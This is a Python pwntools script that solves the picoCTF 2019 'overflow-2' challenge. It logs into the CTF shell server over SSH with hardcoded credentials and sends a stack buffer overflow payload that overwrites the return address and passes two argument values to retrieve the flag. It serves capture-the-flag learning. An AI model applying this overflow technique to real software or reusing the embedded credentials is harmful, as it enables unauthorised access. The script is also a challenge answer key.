import pwn
import re
#https://security.stackexchange.com/questions/172053/how-to-pass-parameters-with-a-buffer-overflow
# python -c "import pwn;print('A'*188 + pwn.p32(0x080485e6) + 'A'*4 + pwn.p32(0xDEADBEEF) + pwn.p32(0xC0DED00D)) " | ./vuln

try:
    session = pwn.ssh(host='2019shell1.picoctf.com', user='cse331', password='3curityishard', level=50)
    p = session.process(cwd='/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e', executable='./vuln')
    p.sendlineafter(': ', 'A'*188 + '\xe6\x85\x04\x08' + 'A'*4 + '\xEF\xBE\xAD\xDE' + '\x0D\xD0\xDE\xC0')
    recvl = p.recvall();

    flag = re.search(r"picoCTF{(.*)}", str(recvl))
    print(flag.groups()[0])
except:
    print('lost connection to server')
